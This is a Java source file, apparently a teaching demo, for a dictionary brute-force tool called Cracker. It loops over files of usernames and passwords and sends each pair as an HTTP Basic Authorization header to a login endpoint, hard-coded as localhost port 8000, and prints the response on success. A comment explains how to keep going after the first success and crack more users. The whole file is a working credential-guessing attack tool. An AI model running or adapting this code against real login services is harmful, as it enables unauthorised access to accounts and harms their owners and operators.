import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.xml.bind.DatatypeConverter;

public class Cracker {

    // Attempt a login, returns true if successful
    public boolean attempt(String location, String guess) {
        try {
            URL url = new URL(location);
            String encoding = DatatypeConverter.printBase64Binary(guess.getBytes("UTF-8"));
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Authorization", "Basic " + encoding);
            InputStream content = (InputStream) connection.getInputStream();
            BufferedReader in = new BufferedReader(new InputStreamReader(content));
            System.out.println("");
            String line;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }
            return true;
        } catch (Exception e) {
            System.out.print(".");
            return false;
        }
    }

    // Iterate through sorted lists of common usernames and passwords
    // This passwords list has been cleaned and shortened. The real lists, e.g. much
    // larger and available searching GitHub, contain extremely offensive words
    public void run() {
        System.out.print("Attempting to crack passwords: ");
        try {
            // Iterate through usernames
            FileInputStream userStream = new FileInputStream("usernames.txt");
            BufferedReader userReader = new BufferedReader(new InputStreamReader(userStream));
            String user;
            label: while ((user = userReader.readLine()) != null) {
                // Iterate through passwords
                FileInputStream passwordStream = new FileInputStream("passwords.txt");
                BufferedReader passwordReader = new BufferedReader(new InputStreamReader(passwordStream));
                String password;
                while ((password = passwordReader.readLine()) != null) {
                    if (attempt("http://127.0.0.1:8000/login", user + ":" + password)) {
                        break label; // Comment this line if you want to crack more users
                    }
                }
                passwordReader.close();
            }
            userReader.close();
        } catch (Exception e) {
        }
    }

    public static void main(String[] args) {
        new Cracker().run();
    }
}
